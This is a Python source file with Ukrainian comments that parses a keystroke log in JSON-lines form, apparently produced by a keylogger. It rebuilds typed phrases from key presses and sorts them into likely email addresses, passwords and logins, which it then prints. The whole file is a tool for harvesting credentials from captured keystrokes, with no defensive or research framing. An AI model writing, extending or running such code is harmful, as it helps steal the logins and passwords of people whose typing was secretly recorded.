import json
import os
import re


class SensitiveAnalyzer:
    def __init__(self, log_file=r"logs\log_2024-09-27_01-26-18.txt"):
        self.log_file = log_file
        self.current_phrase = ""
        self.potential_logins = []
        self.potential_passwords = []
        self.potential_emails = []

    def analyze(self):
        """Аналізує лог на наявність чутливих даних та виводить фрази."""
        if not os.path.exists(self.log_file):
            print(f"Лог файл '{self.log_file}' не знайдено.")
            return

        with open(self.log_file, 'r', encoding='utf-8') as log_file:
            for line in log_file:
                entry = json.loads(line)
                if entry["event_type"] == "key_press":
                    key = entry["details"].get("key")
                    if key and len(key) == 1:  # Перевіряємо лише односимвольні клавіші
                        self.current_phrase += key
                    elif key == "Key.space":
                        self.current_phrase += " "
                    elif key == "Key.enter":
                        self.finish_phrase()

        self.display_results()

    def finish_phrase(self):
        """Завершує збирання фрази і перевіряє її на чутливі дані."""
        phrase = self.current_phrase.strip()

        # Перевірка на email
        if self.is_email(phrase):
            self.potential_emails.append(phrase)

        # Перевірка на можливі паролі
        if self.is_password(phrase):
            self.potential_passwords.append(phrase)

        # Перевірка на можливі логіни
        if self.is_login(phrase):
            self.potential_logins.append(phrase)

        # Очищення поточної фрази після перевірки
        self.current_phrase = ""

    def is_email(self, phrase):
        """Перевірка, чи є фраза поштовою адресою."""
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        return re.match(email_pattern, phrase)

    def is_password(self, phrase):
        """Перевірка, чи є фраза можливим паролем (довжина > 6, містить цифри та букви)."""
        return len(phrase) > 6 and re.search(r'\d', phrase) and re.search(r'[a-zA-Z]', phrase)

    def is_login(self, phrase):
        """Перевірка, чи є фраза можливим логіном (довжина > 3, не email)."""
        return len(phrase) > 3 and not self.is_email(phrase)

    def display_results(self):
        """Виведення результатів аналізу."""
        print("\n--- Розпізнані email ---")
        for email in self.potential_emails:
            print(email)

        print("\n--- Розпізнані паролі ---")
        for password in self.potential_passwords:
            print(password)

        print("\n--- Розпізнані логіни ---")
        for login in self.potential_logins:
            print(login)


if __name__ == "__main__":
    analyzer = SensitiveAnalyzer()
    analyzer.analyze()
